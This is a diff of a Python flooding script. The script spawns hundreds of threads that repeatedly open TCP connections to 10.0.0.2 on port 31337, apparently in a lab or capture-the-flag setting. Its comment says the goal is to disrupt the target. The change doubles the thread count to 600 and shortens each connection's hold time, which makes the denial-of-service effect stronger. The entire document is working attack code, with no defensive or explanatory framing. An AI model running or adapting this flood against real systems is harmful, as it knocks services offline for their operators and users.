@@ -30,12 +30,12 @@ def spam():
     while True:
         try:
             s = socket.create_connection(("10.0.0.2", 31337), timeout=2)
-            time.sleep(2)
+            time.sleep(1.2) # close the connection after the socket is terminated by the server
             s.close()
         except:
             pass
 
-for _ in range(300):  # tweak based on system capacity
+for _ in range(600):  # tweak based on system capacity
     threading.Thread(target=spam, daemon=True).start()
 
 time.sleep(120)  # let it run long enough to disrupt
